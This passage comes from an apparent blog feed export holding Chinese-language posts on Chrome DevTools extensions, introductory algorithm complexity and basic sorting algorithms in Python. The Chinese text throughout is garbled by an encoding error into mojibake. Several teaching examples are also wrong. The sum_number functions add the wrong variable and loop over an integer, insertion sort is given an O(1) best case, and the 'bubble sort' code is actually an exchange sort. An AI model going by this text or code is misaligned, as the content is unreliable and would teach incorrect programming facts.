çµè«–ä»Šå¤©é€éå…©ç¨®ç¯„ä¾‹ä»‹ç´¹äº†å¦‚ä½•ç”¨æœ€ä¸»è¦çš„ Devtools API ä¾†æ­å»º Devtools extensionï¼Œä½†ç•¶ç„¶é‚„æœ‰è¨±å¤š API æˆ–æ˜¯ Event æ²’æœ‰ä»‹ç´¹åˆ°ï¼Œåƒ panels å°±æœ‰ onShown, onHide ç­‰ç›£è½ devtools æ˜¯å¦æœ‰é–‹å•Ÿçš„äº‹ä»¶å¯ä»¥ç”¨ï¼Œä¸éå¾ˆé›£å¾ä¸€æ¬¡çš„ç¯„ä¾‹ä¸­å…¨éƒ¨ä»‹ç´¹åˆ°ï¼Œæœ‰éœ€è¦çš„è©±é‚„æ˜¯å¾—å»æŸ¥çœ‹å®˜æ–¹æ–‡ä»¶ã€‚è‡³å°‘å¸Œæœ›èƒ½è®“å¤§å®¶å°æ–¼è£½ä½œå¢åŠ è‡ªå·±å·¥ä½œæ•ˆç‡çš„å·¥å…·æœ‰ä¸€å€‹åˆæ­¥çš„é–‹å§‹æ–¹å‘ï¼Œæœ‰ä»»ä½•å•é¡Œä¹Ÿæ­¡è¿æå‡ºæŒ‡æ•™ï¼

è³‡æ–™ä¾†æº
Google offical doc
Chrome Extension CSP é–‹ç™¼å°è¨˜
Chrome æ’ä»¶(æ“´å±•)å…¨æ”»ç•¥

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>Chrome</tag>
        <tag>devtools</tag>
        <tag>extension</tag>
      </tags>
  </entry>
  <entry>
    <title>åŸºç¤é›»è…¦ç§‘å­¸ï¼šæ¼”ç®—æ³•æ¦‚è¦</title>
    <url>/2019/03/01/computer-science-algorithm-introduction/</url>
    <content><![CDATA[
å‰è¨€éš¨è‘—è³‡è¨Šç§‘æŠ€ç™¼å±•ï¼Œæ¼”ç®—æ³•å·²ç¶“ç„¡æ‰€ä¸åœ¨å­˜åœ¨æˆ‘å€‘çš„ç”Ÿæ´»ç•¶ä¸­ã€‚èˆ‰å‡¡ä¸Šç¶² google æœå°‹è³‡æ–™ã€ä¸‹è¼‰æª”æ¡ˆçš„å£“ç¸®æ–¹æ³•ã€æª”æ¡ˆçš„åŠ å¯†å‚³è¼¸ç­‰ï¼Œéƒ½å¯ä»¥çœ‹åˆ°æ¼”ç®—æ³•é‹ä½œçš„è¹¤è·¡ã€‚ä¸€èˆ¬ä¾†èªªè³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•æ˜¯ç¨‹å¼è¨­è¨ˆæœ€åŸºæœ¬çš„å…§æ¶µï¼Œæ‰€ä»¥æœ‰äººèªªï¼šç¨‹å¼è¨­è¨ˆ = è³‡æ–™çµæ§‹ + æ¼”ç®—æ³•ã€‚é‚£ç©¶ç«Ÿä»€éº¼æ˜¯æ¼”ç®—æ³•&#x2F;ç®—æ³•å‘¢ï¼Ÿ
å’±å€‘ç¶­åŸºç™¾ç§‘çµ¦äº†å€‹éå¸¸éœ€è¦æ…§æ ¹æ‰èƒ½ç†è§£çš„è§£é‡‹ï¼š

æ¼”ç®—æ³•ï¼ˆalgorithmï¼‰ï¼Œåœ¨æ•¸å­¸ï¼ˆç®—å­¸ï¼‰å’Œé›»è…¦ç§‘å­¸ä¹‹ä¸­ï¼Œç‚ºä»»ä½•è‰¯å®šç¾©çš„å…·é«”è¨ˆç®—æ­¥é©Ÿçš„ä¸€å€‹åºåˆ—ï¼Œå¸¸ç”¨æ–¼è¨ˆç®—ã€è³‡æ–™è™•ç†å’Œè‡ªå‹•æ¨ç†ã€‚ç²¾ç¢ºè€Œè¨€ï¼Œæ¼”ç®—æ³•æ˜¯ä¸€å€‹è¡¨ç¤ºçˆ²æœ‰é™é•·ï¼Œåˆ—è¡¨çš„æœ‰æ•ˆæ–¹æ³•ã€‚æ¼”ç®—æ³•æ‡‰åŒ…å«æ¸…æ™°å®šç¾©çš„æŒ‡ä»¤ï¼Œç”¨æ–¼è¨ˆç®—å‡½å¼ã€‚

æˆ‘å€‘æŠŠå®ƒç¿»è­¯æˆäººè©±å§ï¼š

æ¼”ç®—æ³•æ˜¯ä¸€å€‹æœ‰è¼¸å…¥ä¸”æœ‰è¼¸å‡ºçš„è§£æ±ºå•é¡Œçš„æ­¥é©Ÿï¼Œå®ƒå…·æœ‰æ˜ç¢ºå’Œæœ‰é™æ­¥é©Ÿä¸”æœ‰æ•ˆçš„ç‰¹æ€§

èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å€‘ä»Šå¤©è¦å‰µä½œä¸€é“è”¥èŠ±è›‹æˆ–èœè„¯è›‹ï¼Œæˆ‘çš„æ­¥é©Ÿæœƒæ˜¯æŠŠææ–™ç•¶åšè¼¸å…¥ï¼š

æ”¾é»æ²¹
æ‰“è›‹
å¦‚æœå–œæ­¡è”¥èŠ±å¯ä»¥åŠ å…¥è”¥èŠ±ï¼Œå¦‚æœå–œæ­¡èœè„¯å¯ä»¥åŠ å…¥èœè„¯ï¼ˆç¨‹å¼è¡“èªï¼šif...else æ¢ä»¶åˆ¤æ–·ï¼‰
æ”¾å…¥å°‘è¨±é¹½å·´
ä¸­ç«å¿«ç‚’ï¼Œç¿»äº”æ¬¡é¢ï¼ˆç¨‹å¼è¡“èªï¼šfor è¿´åœˆï¼‰
ç•¶çœ‹åˆ°è›‹é¢å‘ˆç¾é‡‘é»ƒè‰²æ™‚å¯ä»¥èµ·é‹ï¼ŒçµæŸæ–™ç†ï¼ˆç¨‹å¼è¡“èªï¼šwhile è¿´åœˆï¼‰
å¥½åƒçš„è”¥èŠ±è›‹æˆ–èœè„¯è›‹ä¸Šæ¡Œ

é€éæ¸…æ¥šæ˜ç¢ºçš„æœ‰é™æ­¥é©Ÿï¼Œæˆ‘å€‘å¯ä»¥è§£æ±ºæˆ‘å€‘æƒ³è§£æ±ºçš„å•é¡Œä¸¦ç”¢å‡ºæˆ‘å€‘è¦çš„è¼¸å‡ºçµæœ
æ¼”ç®—æ³•çš„å®šç¾©ä¸€èˆ¬æ¼”ç®—æ³•åš´è¬¹çš„æ¢ä»¶å¿…é ˆç¬¦åˆï¼š

è¼¸å…¥ï¼ˆInputï¼‰ï¼š0 æˆ–å¤šå€‹è¼¸å…¥
è¼¸å‡ºï¼ˆOutputï¼‰ï¼šè‡³å°‘æœ‰ä¸€å€‹å›å‚³çµæœï¼ˆæœ‰å¯èƒ½å›å‚³ 0 æˆ–æ˜¯ nullï¼‰
æ˜ç¢ºæ€§ï¼ˆDefinitenessï¼‰ï¼šæ¯ä¸€å€‹æŒ‡ä»¤æ­¥é©Ÿå¿…é ˆæ˜ç¢º
æœ‰é™æ€§ï¼ˆFinitenessï¼‰ï¼šåœ¨æœ‰é™æ­¥é©Ÿå¾Œä¸€å®šæœƒçµæŸä¸æœƒé€²å…¥ç„¡çª®è¿´åœˆ
æœ‰æ•ˆæ€§ï¼ˆEffectivenessï¼‰ï¼šæ­¥é©Ÿæ¸…æ¥šå¯è¡Œï¼Œèƒ½ä½¿ç”¨ç´™ç­†è¨ˆç®—æ±‚è§£

èˆ‰å€‹ä¾‹å­ï¼š
ä¸‹é¢æ˜¯ä¸€å€‹ Python åˆ¤æ–·æ˜¯å¦å¯ä»¥æŠ•ç¥¨çš„æ¼”ç®—æ³•ï¼ˆå‡è¨­å¯ä»¥æŠ•ç¥¨ç‚º 18 æ­²ï¼‰ï¼Œä»”ç´°çœ‹ä¸‹é¢çš„ç®—æ³•é›–ç„¶ç°¡å–®ä½†æœ‰è¼¸å…¥ä¹Ÿæœ‰è¼¸å‡ºï¼Œä¸”æœ‰æ˜ç¢ºæœ‰é™æ­¥é©Ÿï¼Œæ­¥é©Ÿå¯è¡Œ
def check_can_vote(age):    if age &gt;= 18:        return True    else:        return Falsecheck_can_vote(20)

è©•ä¼°è¤‡é›œåº¦äº‹å¯¦ä¸Šï¼Œè§£æ±ºä¸€å€‹å•é¡Œä¸ä¸€å®šåªæœ‰ä¸€ç¨®æ¼”ç®—æ³•ã€‚é‚£æˆ‘å€‘æ€éº¼è©•ä¼°æ¼”ç®—æ³•çš„å¥½å£å‘¢ï¼Ÿä¸€èˆ¬ä¾†èªªæœƒæœ‰å…©ç¨®æ–¹å¼ï¼šæ™‚é–“è¤‡é›œåº¦å’Œç©ºé–“è¤‡é›œåº¦ï¼Œæ¯”è¼ƒå¸¸è¦‹çš„æ˜¯ä½¿ç”¨æ™‚é–“è¤‡é›œåº¦
æ™‚é–“è¤‡é›œåº¦ï¼ˆTime Complexityï¼‰æƒ³è¦è©•ä¼°ä¸€å€‹æ¼”ç®—æ³•åŸ·è¡Œé€Ÿåº¦å¿«æ…¢ï¼Œæœ€ç›´è¦ºçš„æ–¹å¼æ˜¯æ¸¬é‡æ¼”ç®—æ³•è¨ˆç®—çš„æ™‚é–“ã€‚ä½†ç”±æ–¼åŸ·è¡Œæ™‚é–“æœƒå—ä¸åŒé›»è…¦&#x2F;è¨ˆç®—æ©Ÿæ©Ÿå™¨ç¡¬é«”è¦æ ¼èˆ‡å¯¦ä½œæ–¹å¼å½±éŸ¿ï¼Œå¾ˆé›£æ”¾è«¸å››æµ·çš†æº–ï¼Œå› æ­¤å­¸è¡“ä¸Šå‚¾å‘æ–¼çµ±è¨ˆæ¼”ç®—æ³•æ­¥é©Ÿæ•¸ç›®ï¼Œç•¶åšæ™‚é–“è¤‡é›œåº¦å¯è€ƒé‡ã€‚
æœ€å¸¸è¦‹çš„è©•ä¼°æ¼”ç®—æ³•å¥½å£å°±æ˜¯æ™‚é–“è¤‡é›œåº¦ï¼Œæ™‚é–“è¤‡é›œåº¦æ˜¯æŒ‡é‹ç”¨æ¦‚é‡ï¼ˆæ¼¸è¿‘åˆ†æ asymptotic analysisï¼Œä¾‹å¦‚ï¼šç•¶ f(n) &#x3D; n^2 + 3n é€™å€‹å‡½æ•¸ n å¾ˆå¤§æ™‚ï¼Œ3n æœƒæ¯” n^2 å°å¾ˆå¤šï¼Œå¯ä»¥å¿½ç•¥ä¸è¨ˆã€‚ç•¶ n è¶¨è¿‘ç„¡é™å¤§æ™‚ï¼Œf(n) ç­‰åƒ¹æ–¼ n^2ï¼‰è€Œéçµ•å°æ™‚é–“ï¼ˆå› ç‚ºæœƒç‰½æ¶‰åˆ°é›»è…¦&#x2F;è¨ˆç®—æ©Ÿç’°å¢ƒè®Šå› ï¼Œæ‰€ä»¥çµ•å°æ™‚é–“ä¸å®¹æ˜“æº–ç¢ºï¼‰ï¼Œé€šå¸¸æˆ‘å€‘ä½¿ç”¨ Big O notation å¤§ O ç¬¦è™Ÿä¾†è¡¨ç¤ºæ™‚é–“è¤‡é›œåº¦ã€‚å‡è¨­ç®—æ³•å‡½å¼æ‰€éœ€åŸ·è¡Œæ™‚é–“ç‚º T(n) ï¼Œå‰‡æˆ‘å€‘å°‡å…¶æ™‚é–“è¤‡é›œåº¦è¡¨ç¤ºç‚º O(f(n))ã€‚f(n) åˆç¨±ç‚ºåŸ·è¡Œæ™‚é–“çš„æˆé•·ç‡ï¼Œæ˜¯å½±éŸ¿é€Ÿåº¦æœ€å¤§çš„è®Šæ•¸ã€‚
é¦–å…ˆæˆ‘å€‘å…ˆä¾†çœ‹ O(1) çš„ä¾‹å­ï¼Œé€™å€‹æ¼”ç®—æ³•åŸ·è¡Œçš„æ­¥é©Ÿæ˜¯å›ºå®šçš„ï¼Œè·Ÿè¼¸å…¥çš„å€¼ç„¡é—œï¼š
# ä¸ç®¡ n è¼¸å…¥ç‚ºå¤šå°‘ï¼Œé€™å€‹ç¨‹å¼æ°¸é åªæœƒåŸ·è¡Œä¸€æ¬¡def print_num(num):    print(num)print_num(10)

ä¸‹é¢é€™å€‹ä¾‹å­å°±æ˜¯ O(n) çš„ä¾‹å­ï¼Œæ™‚é–“è¤‡é›œåº¦è·Ÿè¼¸å…¥çš„æ¬¡æ•¸æœ‰é—œï¼Œéš¨è‘— num è®Šå¤§æ‰€éœ€è¦è·‘ num æ¬¡ï¼Œæ˜¯ç·šæ€§æ™‚é–“çš„æˆé•·ã€‚é€™é‚Š f(n) ç­‰æ–¼ nï¼Œæ‰€ä»¥ O(f(n)) å°±æ˜¯ O(n)
def sum_number(num):    total = 0    for n in num:        total += num    return totalsum_number(10)

O(nlog(n))
ä¸€èˆ¬å¸¸è¦‹çš„æ™‚é–“è¤‡é›œåº¦å¦‚ä¸‹åœ–è¡¨æ˜¯ï¼š
ç©ºé–“è¤‡é›œåº¦æ¼”ç®—æ³•çš„ç©ºé–“è¤‡é›œåº¦æ˜¯æŒ‡æ¼”ç®—æ³•æ‰€éœ€è¦æ¶ˆè€—çš„å„²å­˜è¨˜æ†¶é«”è³‡æºã€‚å…¶è¨ˆç®—å’Œè¡¨ç¤ºæ–¹æ³•èˆ‡æ™‚é–“è¤‡é›œåº¦é¡ä¼¼ï¼Œä¸€èˆ¬éƒ½ç”¨è¤‡é›œåº¦çš„æ¼¸è¿‘æ€§ä¾†è¡¨ç¤ºï¼ˆasymptotic analysisï¼‰ã€‚
ä¾‹å¦‚ä¸‹é¢é€™å€‹å‡½å¼ï¼Œä¸ç®¡ç¨‹å¼è·‘äº†å¤šå°‘éï¼Œéƒ½ä¸æœƒå½±éŸ¿ä½¿ç”¨çš„è®Šæ•¸æ•¸é‡ï¼Œæ•…è©²å‡½å¼çš„ç©ºé–“è¤‡é›œåº¦ç‚º O(1)ï¼š
def sum_number(num):    total = 0    for n in num:        total += num    return totalsum_number(10)

ä½†ä¸‹é¢é€™å€‹å‡½å¼ï¼Œæœƒéš¨è‘—ä¸Ÿé€²å»çš„æ•¸å­—è€Œå½±éŸ¿è®Šæ•¸çš„é‡ï¼Œä¾‹å¦‚ï¼š
è¼¸å…¥ç‚º nï¼Œå°±æ›ç”¢ç”Ÿ n å€‹è®Šæ•¸ç©ºé–“éœ€è¦å„²å­˜ï¼Œæ•…è©²å‡½å¼ç©ºé–“è¤‡é›œåº¦ç‚º O(n)
def sum_number(num):    total = []    for n in num:        total.append(num)sum_number(10)

ç¸½çµä»¥ä¸Šç°¡å–®ä»‹ç´¹äº†æ¼”ç®—æ³•å…¥é–€æ•™å­¸ã€‚éš¨è‘—è³‡è¨Šç§‘æŠ€ç™¼å±•ï¼Œæ¼”ç®—æ³•å·²ç¶“ç„¡æ‰€ä¸åœ¨å­˜åœ¨æˆ‘å€‘çš„ç”Ÿæ´»ç•¶ä¸­ã€‚èˆ‰å‡¡ä¸Šç¶² google æœå°‹è³‡æ–™ã€ä¸‹è¼‰æª”æ¡ˆçš„å£“ç¸®æ–¹æ³•ã€æª”æ¡ˆçš„åŠ å¯†å‚³è¼¸ç­‰ï¼Œéƒ½å¯ä»¥çœ‹åˆ°æ¼”ç®—æ³•é‹ä½œçš„è¹¤è·¡ï¼Œæ‰€ä»¥å€¼å¾—æˆ‘å€‘ç´°ç´°å“å‘³ã€‚é‚£æˆ‘å€‘ä¸‹å›è¦‹å›‰ï¼
åƒè€ƒæ–‡ä»¶
å°å¸«å¤§æ¼”ç®—æ³•ç­†è¨˜
æ¼”ç®—æ³•èˆ‡è³‡æ–™çµæ§‹
å¤§Oç¬¦è™Ÿ
Algorithm Analysis
All you need to know about â€œBig O Notationâ€ to crack your next coding interview

ï¼ˆimage via pandorafmsã€freecodecampï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>algorithm</tag>
        <tag>ç¨‹å¼è¨­è¨ˆ</tag>
        <tag>programming</tag>
        <tag>coding</tag>
        <tag>æ¼”ç®—æ³•</tag>
        <tag>ç®—æ³•</tag>
        <tag>computer science</tag>
        <tag>é›»è…¦ç§‘å­¸</tag>
      </tags>
  </entry>
  <entry>
    <title>åŸºç¤é›»è…¦ç§‘å­¸ï¼šæ’åºï¼ˆsortingï¼‰æ¼”ç®—æ³•å…¥é–€ä¸Š</title>
    <url>/2019/03/10/computer-science-sorting-algorithm-part1/</url>
    <content><![CDATA[
å‰è¨€æ’åºï¼ˆsortingï¼‰å’Œæœå°‹ï¼ˆsearchï¼‰æ˜¯æ¼”ç®—æ³•ï¼ˆalgorithmï¼‰ä¸­æœ€å¸¸è¦‹çš„å…¥é–€çŸ¥è­˜ã€‚é›–ç„¶æˆ‘å€‘åœ¨ä¸€èˆ¬ç¨‹å¼é–‹ç™¼çš„å ´åˆä¸­è¼ƒå°‘æœƒéœ€è¦è‡ªå·±å¯¦ä½œæ’åºå’Œæœå°‹æ¼”ç®—æ³•ï¼Œä½†æ’åºï¼ˆsortï¼‰å’Œæœå°‹ï¼ˆsearchï¼‰çš„è§€å¿µä¹Ÿå¸¸å‡ºç¾åœ¨å…¶ä»–çš„æ¼”ç®—æ³•ç•¶ä¸­ï¼Œæ‡‰ç”¨å±¤é¢å¾ˆå»£ã€‚æœ¬ç³»åˆ—æ–‡ç« å°‡ä½¿ç”¨ Python ä¾†å¯¦ä½œå¹¾å€‹ç¶“å…¸æ¼”ç®—æ³•ã€‚é¦–å…ˆæˆ‘å€‘å…ˆä¾†ä»‹ç´¹ï¼šé¸æ“‡æ’åºã€æ’å…¥æ’åºå’Œæ°£æ³¡æ’åºæ³•ã€‚
é¸æ“‡æ’åºæ³•é¸æ“‡æ’åºæ³•æ˜¯ä¸€ç¨®ååˆ†ç›´è§€çš„æ’åºæ¼”ç®—æ³•ï¼ˆå°±æ˜¯é¸æ“‡æœ€å°çš„å€¼å’Œç¬¬ä¸€å€‹åˆå§‹å€¼äº’æ›ï¼‰ï¼Œå…¶åŸºæœ¬åŸç†å¦‚ä¸‹ï¼š

çµ¦å®šä¸€å€‹æ•¸å­—çµ„åˆå’Œåˆå§‹æœ€å°å€¼ä½å€¼ï¼ˆä¸€é–‹å§‹ index ç‚º 0ï¼‰
ç¶“éç¬¬ä¸€è¼ªæ¯å€‹æ•¸å­—å’Œæœ€å°å€¼æ¯”è¼ƒï¼Œå°‡å–å‡ºçš„æœ€å°å€¼å’Œç¬¬ä¸€å€‹æ•¸å­—ä½ç½®å°èª¿ï¼ˆé¸æ“‡æœ€å°çš„å€¼ï¼‰
æ¥è‘—é™¤äº†ç¬¬ä¸€å€‹å·²æ’åºå¥½çš„æ•¸å­—å¤–ï¼Œå…¶é¤˜æ•¸å­—æŒçºŒæœ€å°å€¼æ¯”è¼ƒï¼ˆindex ç‚º 1ï¼‰ï¼Œè‹¥æœ‰æ›´å°å€¼å‰‡å’Œ index ç‚º 1ï¼ˆç¬¬äºŒå€‹ï¼‰å€¼äº’æ›
æŒçºŒé€²è¡Œæ¯”è¼ƒåˆ°èƒ½æ¯”è¼ƒçš„å€¼åªå‰©ä¸‹ä¸€å€‹ï¼Œå‰‡ç”±å°åˆ°å¤§çš„æ’åºå®Œæˆ

èˆ‰ä¾‹ä¾†èªªï¼›
æœ‰ä¸€å€‹ä¸²åˆ— [9, 4, 11, 2, 7] å¸Œæœ›ç”±å°åˆ°å¤§æ’åºã€‚
åˆå§‹æœ€å°å€¼ç‚º index &#x3D; 0 çš„ 9

ç¬¬ä¸€æ¬¡æ’åºå¾Œï¼š2 [4, 11, 9, 7]ï¼š2 æ¯” 9 å°ï¼Œæ‰€ä»¥äº’æ›ä½ç½®

ç¬¬äºŒæ¬¡æ’åºå¾Œï¼š2, 4, [11, 9, 7]ï¼Œ4 ç‚ºåˆå§‹æœ€å°å€¼ï¼Œæ²’æœ‰å¯ä»¥äº’æ›çš„å€¼

ç¬¬ä¸‰æ¬¡æ’åºå¾Œï¼š2, 4, [11, 9, 7]ï¼Œ11 ç‚ºåˆå§‹æœ€å°å€¼ï¼Œ7 æ˜¯å³é‚Šæ¯” 11 å°çš„æœ€å°å€¼ï¼Œå…©è€…äº’æ›

ç¬¬å››æ¬¡æ’åºå¾Œï¼š2, 4, 7, [9, 11]ï¼Œ9 ç‚ºåˆå§‹æœ€å°å€¼ï¼Œæ²’æœ‰å¯ä»¥äº’æ›çš„å€¼

ç¬¬äº”æ¬¡æ’åºå¾Œï¼š2, 4, 7, 9, [11]ï¼Œ11 ç‚ºåˆå§‹æœ€å°å€¼ï¼Œæ²’æœ‰å¯ä»¥äº’æ›çš„å€¼

æœ€å¾Œæ’åºçµæœï¼š2, 4, 7, 9, 11


ä½¿ç”¨ Python ç¨‹å¼å¯¦ä½œï¼š
def selection_sort(num_list):    &quot;&quot;&quot;    :param num_list: a list want to sort    &quot;&quot;&quot;    num_list_length = len(num_list)    for i in range(0, num_list_length):        min_num_index = i        for j in range(i + 1, num_list_length):            if num_list[min_num_index] &gt; num_list[j]:                min_num_index = j        num_list[min_num_index], num_list[i] = num_list[i], num_list[min_num_index]    return num_listif __name__ == &#x27;__main__&#x27;:    num_list = [9, 4, 11, 2, 7]    print(&#x27;é¸æ“‡æ’åºå‰ï¼š&#123;&#125;&#x27;.format(num_list))    print(&#x27;é¸æ“‡æ’åºå¾Œï¼š&#123;&#125;&#x27;.format(selection_sort(num_list)))

é¸æ“‡æ’åºæ³•æ˜¯ä¸€ç¨®ä¸ç©©å®šæ’åºæ–¹æ³•ï¼Œä¸”éœ€è¦è¿­ä»£å¤šæ¬¡ï¼Œå…¶æœ€å¥½å’Œæœ€å£ä»¥åŠå¹³å‡æ™‚é–“è¤‡é›œåº¦çš†ç‚º O(n^2)ï¼Œæ‰€éœ€å„²å­˜ç©ºé–“ä¸å› è¼¸å…¥å€‹æ•¸æ”¹è®Šã€‚åƒ…å„²å­˜ä¸€å€‹ index å€¼ï¼Œæ•…ç©ºé–“è¤‡é›œåº¦ç‚º O(1)
æ’å…¥æ’åºæ³•æ’å…¥æ’åºæ³•å°±åƒæ˜¯ç©å¤§è€äºŒæ’²å…‹ç‰Œä¸€é–‹å§‹æ•´ç†æ‰‹ç‰Œä¸€æ¨£ï¼Œæ‹¿åˆ°æ–°ç™¼çš„ç‰Œå°±æ’å…¥å·²æ’åºå¥½çš„æ‰‹æ’å°æ‡‰çš„ä½ç½®ï¼Œå…¶åŸºæœ¬åŸç†å¦‚ä¸‹ï¼š

çµ¦å®šä¸€å€‹æ•¸å­—çµ„åˆä¸¦å‡è¨­ç¬¬ä¸€å€‹å€¼æˆç‚ºä¸€å·²æ’åºæ•¸åˆ—
ç¶“éç¬¬ä¸€è¼ªæ¯å€‹æ•¸å­—å’Œå·²æ’åºæ•¸åˆ—æ¯”è¼ƒï¼Œå°‡å€¼æ’å…¥å·²æ’åºæ•¸åˆ—å°æ‡‰ä½ç½®
ç›´åˆ°æœ€å¾Œä¸€å€‹æ•¸å­—ä¹Ÿå·²æ’å…¥å·²æ’åºåˆ—ä¸­å‰‡æ’åºçµæŸ

èˆ‰ä¾‹ä¾†èªªï¼š
æœ‰ä¸€å€‹ä¸²åˆ— [9, 4, 11, 2, 7] å¸Œæœ›ç”±å°åˆ°å¤§æ’åºã€‚

ç¬¬ä¸€æ­¥æ’å…¥ 9 å¾Œï¼š[9], 4, 11, 2, 7

ç¬¬äºŒæ­¥æ’å…¥ 4 å¾Œï¼š[4, 9], 11, 2, 7

ç¬¬ä¸‰æ­¥æ’å…¥ 11 å¾Œï¼š[4, 9, 11], 2, 7

ç¬¬å››æ­¥æ’å…¥ 9 å¾Œï¼š[2, 4, 9, 11], 7

æœ€å¾Œæ’åºçµæœï¼š[2, 4, 7, 9, 11]


ä½¿ç”¨ Python ç¨‹å¼å¯¦ä½œï¼š
def insert_sort(num_list):    &quot;&quot;&quot;    :param num_list: a list want to sort    &quot;&quot;&quot;    num_list_length = len(num_list)    for i in range(1, num_list_length):        insert_value = num_list[i]        j = i - 1        while j &gt;= 0:            if num_list[j] &gt; insert_value:                num_list[j + 1] = num_list[j]                num_list[j] = insert_value            j -= 1    return num_listif __name__ == &#x27;__main__&#x27;:    num_list = [9, 4, 11, 2, 7]    print(&#x27;æ’å…¥æ’åºå‰ï¼š&#123;&#125;&#x27;.format(num_list))    print(&#x27;æ’å…¥æ’åºå¾Œï¼š&#123;&#125;&#x27;.format(insert_sort(num_list)))

æ’å…¥æ’åºæ³•æ˜¯ä¸€ç¨®ç©©å®šæ’åºæ–¹æ³•ï¼Œå…¶æœ€å¥½æƒ…æ³ä¸‹æ™‚é–“è¤‡é›œåº¦ç‚º O(1)ï¼ˆä¸€é–‹å§‹å·²ç¶“æ’åºå¥½ï¼‰ï¼Œæœ€å£ä»¥åŠå¹³å‡æ™‚é–“è¤‡é›œåº¦ç‚º O(n^2)ã€‚æ‰€éœ€å„²å­˜ç©ºé–“ä¸å› è¼¸å…¥å€‹æ•¸è€Œæ”¹è®Šï¼Œæ•…ç©ºé–“è¤‡é›œåº¦ç‚º O(1)
æ°£æ³¡æ’åºæ³•æ°£æ³¡æ’åºæ³•é¡§åæ€ç¾©å°±æ˜¯åœ¨æ’åºçš„éç¨‹ä¸­ï¼Œæ’åºçš„å€¼å…©å…©æ¯”è¼ƒï¼Œå¤§çš„å€¼å°±åƒæ°£æ³¡ä¸€æ¨£ç”±æ°´åº•å¾€ä¸Šå‡ï¼ˆå¾€ä¸€é‚Šé æ”ï¼‰ã€‚å–®å‘æ°£æ³¡æ’åºåŸºæœ¬æ€è·¯å¦‚ä¸‹ï¼ˆå‡è¨­ç”±å°åˆ°å¤§æ’åºï¼‰ï¼š
å°æ–¼çµ¦å®š n å€‹æ•¸å€¼ï¼Œä¸€é–‹å§‹ç”±ç¬¬ä¸€å€‹å€¼ä¾åºå’Œä¹‹å¾Œæ¯å€‹å€¼å…©å…©æ¯”è¼ƒï¼Œè‹¥ç›®å‰å€¼æ¯”è¨˜éŒ„å€¼å¤§æ™‚å‰‡äº¤æ›ä½ç½®ã€‚ç•¶å®Œæˆä¸€è¼ªæ¯”è¼ƒå¾Œæœ€å¤§å€¼å°‡æ–¼ç¬¬ n ä½ï¼Œç„¶å¾Œå‰ n - 1 ä½é€²è¡Œç¬¬äºŒè¼ªæ¯”è¼ƒï¼Œé‡è¤‡é€²è¡Œéç¨‹åˆ°åªå‰©ä¸‹ä¸€ä½ç‚ºæ­¢ã€‚
èˆ‰ä¾‹ä¾†èªªï¼›
æœ‰ä¸€å€‹ä¸²åˆ— [9, 4, 11, 2, 7] å¸Œæœ›ç”±å°åˆ°å¤§æ’åºã€‚

ç¬¬ä¸€è¼ªäº¤æ›å¾Œï¼š4, 9, 2, 7, 11

ç¬¬äºŒè¼ªäº¤æ›å¾Œï¼š4, 2, 7, 9, 11

ç¬¬ä¸‰è¼ªäº¤æ›å¾Œï¼š2, 4, 7, 9, 11

æœ€å¾Œæ’åºçµæœï¼š2, 4, 7, 9, 11


ä½¿ç”¨ Python å¯¦ä½œï¼š
def bubble_sort(num_list):    &quot;&quot;&quot;    :param num_list: a list want to sort    &quot;&quot;&quot;    list_length = len(num_list)    for i in range(0, list_length):        for j in range(i + 1, list_length):            if num_list[i] &gt; num_list[j]:                num_list[i], num_list[j] = num_list[j], num_list[i]    return num_listif __name__ == &#x27;__main__&#x27;:    num_list = [9, 4, 11, 2, 7]    print(&#x27;æ°£æ³¡æ’åºå‰ï¼š&#123;&#125;&#x27;.format(num_list))    print(&#x27;æ°£æ³¡æ’åºå¾Œï¼š&#123;&#125;&#x27;.format(bubble_sort(num_list)))

æ°£æ³¡æ’åºæ³•æ˜¯ä¸€ç¨®ç©©å®šæ’åºæ–¹æ³•ï¼Œå…¶æœ€å¥½æƒ…æ³ä¸‹æ™‚é–“è¤‡é›œåº¦ç‚º O(n)ï¼ˆä¸€é–‹å§‹å·²ç¶“æ’åºå¥½ï¼‰ï¼Œæœ€å£ä»¥åŠå¹³å‡æ™‚é–“è¤‡é›œåº¦ç‚º O(n^2)ã€‚æ‰€éœ€å„²å­˜ç©ºé–“ä¸å› è¼¸å…¥å€‹æ•¸è€Œæ”¹è®Šï¼Œæ•…ç©ºé–“è¤‡é›œåº¦ç‚º O(1)ã€‚
ç¸½çµä»¥ä¸Šç°¡å–®ä»‹ç´¹äº†é¸æ“‡æ’åºã€æ’å…¥æ’åºå’Œæ°£æ³¡æ’åºæ³•ä¸¦ä½¿ç”¨ Python ä¾†å¯¦ä½œå¹¾å€‹ç¶“å…¸æ¼”ç®—æ³•ï¼Œä¸‹å›æˆ‘å€‘å°‡æŒçºŒä»‹ç´¹æ›´å¤šç¶“å…¸ä¸”å¸¸ç”¨çš„æ¼”ç®—æ³•ï¼Œé‚£æˆ‘å€‘ä¸‹æ¬¡è¦‹å›‰ï¼
åƒè€ƒæ–‡ä»¶
å°å¸«å¤§æ¼”ç®—æ³•ç­†è¨˜
æ¼”ç®—æ³•èˆ‡è³‡æ–™çµæ§‹
å¤§Oç¬¦è™Ÿ
Algorithm Analysis
All you need to know about â€œBig O Notationâ€ to crack your next coding interview

ï¼ˆimage via pandorafmsã€brilliantï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>algorithm</tag>
        <tag>ç¨‹å¼è¨­è¨ˆ</tag>
        <tag>programming</tag>
        <tag>coding</tag>
